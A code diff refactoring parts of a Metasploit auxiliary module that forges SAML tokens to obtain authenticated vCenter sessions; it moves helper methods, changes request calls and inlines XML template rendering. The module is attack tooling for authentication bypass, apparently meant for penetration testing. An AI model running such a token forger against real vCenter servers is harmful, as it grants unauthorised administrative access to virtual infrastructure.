@@ -86,14 +86,6 @@ class MetasploitModule < Msf::Auxiliary
     deregister_options('Proxies')
   end
 
-  def rhosts
-    datastore['RHOSTS']
-  end
-
-  def rport
-    datastore['RPORT']
-  end
-
   def username
     datastore['USERNAME']
   end
@@ -129,14 +121,7 @@ class MetasploitModule < Msf::Auxiliary
   def run
     cookie_jar.clear
 
-    unless validate_fqdn(vcenter_fqdn)
-      fail_with(Msf::Exploit::Failure::BadConfig, "Invalid vCenter FQDN provided: #{vcenter_fqdn}")
-    end
-
-    unless validate_fqdn(domain)
-      fail_with(Msf::Exploit::Failure::BadConfig, "Invalid vCenter SSO domain provided: #{domain}")
-    end
-
+    validate_domains
     validate_timestamps
     validate_idp_options
 
@@ -205,7 +190,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def init_vsphere_login
-    res = send_request_raw({
+    res = send_request_cgi({
       'uri' => '/ui/login',
       'method' => 'GET'
     })
@@ -215,7 +200,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     unless res.code == 302
-      fail_with(Msf::Exploit::Failure::UnexpectedReply, "#{rhosts} - expected HTTP 302, got HTTP #{res.code}")
+      fail_with(Msf::Exploit::Failure::UnexpectedReply, "#{rhost} - expected HTTP 302, got HTTP #{res.code}")
     end
 
     datastore['TARGETURI'] = res['location']
@@ -251,17 +236,27 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_saml_response_template
-    body = XMLTemplate.render('assert',
-                              vcenter_fqdn: vcenter_fqdn,
-                              vcenter_saml_id: @vcenter_saml_id,
-                              vcenter_saml_issue: @vcenter_saml_issue,
-                              vcenter_saml_user: username,
-                              vcenter_saml_domain: domain,
-                              vcenter_saml_response_id: @vcenter_saml_response_id,
-                              vcenter_saml_assert_id: @vcenter_saml_assert_id,
-                              vcenter_saml_idx_id: @vcenter_saml_idx_id,
-                              vcenter_saml_not_before: @vcenter_saml_not_before,
-                              vcenter_saml_not_after: @vcenter_saml_not_after)
+    template_path = ::File.join(::Msf::Config.data_directory, 'auxiliary', 'vmware', 'vcenter_forge_saml_token', 'assert.xml.erb')
+    template = ::File.binread(template_path)
+
+    b = binding
+
+    context = {
+      vcenter_fqdn: vcenter_fqdn,
+      vcenter_saml_id: @vcenter_saml_id,
+      vcenter_saml_issue: @vcenter_saml_issue,
+      vcenter_saml_user: username,
+      vcenter_saml_domain: domain,
+      vcenter_saml_response_id: @vcenter_saml_response_id,
+      vcenter_saml_assert_id: @vcenter_saml_assert_id,
+      vcenter_saml_idx_id: @vcenter_saml_idx_id,
+      vcenter_saml_not_before: @vcenter_saml_not_before,
+      vcenter_saml_not_after: @vcenter_saml_not_after
+    }
+
+    locals = context.collect { |k, _| "#{k} = context[#{k.inspect}]; " }
+    b.eval(locals.join)
+    body = b.eval(Erubi::Engine.new(template).src)
 
     body.to_s.strip.gsub("\r\n", '').gsub("\n", '').gsub(/>\s*/, '>').gsub(/\s*</, '<')
   end
@@ -343,7 +338,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     unless res
-      fail_with(Msf::Exploit::Failure::Unreachable, "#{rhosts} - could not reach SAML endpoint")
+      fail_with(Msf::Exploit::Failure::Unreachable, "#{rhost} - could not reach SAML endpoint")
     end
 
     unless res.code == 302
@@ -377,11 +372,14 @@ class MetasploitModule < Msf::Auxiliary
     "JSESSIONID=#{@vcenter_saml_token}; Path=#{@vcenter_saml_path}"
   end
 
-  def validate_fqdn(fqdn)
-    fqdn_regex = /(?=^.{4,253}$)(^((?!-)[a-z0-9-]{0,62}[a-z0-9]\.)+[a-z]{2,63}$)/
-    return true if fqdn_regex.match?(fqdn.to_s.downcase)
+  def validate_domains
+    unless validate_fqdn(vcenter_fqdn)
+      fail_with(Msf::Exploit::Failure::BadConfig, "Invalid vCenter FQDN provided: #{vcenter_fqdn}")
+    end
 
-    false
+    unless validate_fqdn(domain)
+      fail_with(Msf::Exploit::Failure::BadConfig, "Invalid vCenter SSO domain provided: #{domain}")
+    end
   end
 
   def validate_timestamps
@@ -392,23 +390,11 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Msf::Exploit::Failure::BadConfig, 'Advanced options NOT_BEFORE and NOT_AFTER time skew cannot be greater than 2592000 seconds')
     end
   end
-end
 
-# Copied pretty much wholesale from exchange_proxyshell_rce.rb
-class XMLTemplate
-  def self.render(template_name, context = nil)
-    file_path = ::File.join(::Msf::Config.data_directory, 'auxiliary', 'vmware', 'vcenter_forge_saml_token', "#{template_name}.xml.erb")
-    template = ::File.binread(file_path)
-    case context
-    when Hash
-      b = binding
-      locals = context.collect { |k, _| "#{k} = context[#{k.inspect}]; " }
-      b.eval(locals.join)
-    when NilClass
-      b = binding
-    else
-      raise ArgumentError
-    end
-    b.eval(Erubi::Engine.new(template).src)
+  def validate_fqdn(fqdn)
+    fqdn_regex = /(?=^.{4,253}$)(^((?!-)[a-z0-9-]{0,62}[a-z0-9]\.)+[a-z]{2,63}$)/
+    return true if fqdn_regex.match?(fqdn.to_s.downcase)
+
+    false
   end
 end
